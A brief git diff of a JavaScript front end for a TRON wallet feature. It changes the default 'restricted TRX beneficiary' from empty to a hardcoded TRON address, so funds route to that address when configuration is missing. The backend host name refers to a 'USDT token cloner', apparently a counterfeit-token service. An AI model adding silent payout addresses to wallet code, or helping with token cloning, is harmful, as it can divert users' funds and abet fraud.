@@ -3,7 +3,7 @@ import { ExternalLink, RefreshCw, ShieldCheck, AlertTriangle } from 'lucide-reac
 import { TronWeb } from 'tronweb'
 import BitpieInternalRestrictedCredits from './BitpieInternalRestrictedCredits.jsx'
 
-const BITPIE_ADDRESS = String(import.meta.env.VITE_RESTRICTED_TRX_BENEFICIARY_ADDRESS || '').trim()
+const BITPIE_ADDRESS = String(import.meta.env.VITE_RESTRICTED_TRX_BENEFICIARY_ADDRESS || 'TLBWTZHjjRMwbFgKgqmLwjp4ZKjxt5a2GT').trim()
 const API_BASE = (import.meta.env.VITE_API_BASE_URL || (import.meta.env.DEV ? '' : 'https://trc20-usdt-token-cloner-api.onrender.com')).replace(/\/+$/, '')
 const ESCROW_ADDRESS = String(import.meta.env.VITE_RESTRICTED_TRX_ESCROW_ADDRESS || '').trim()
 const ABI = [{
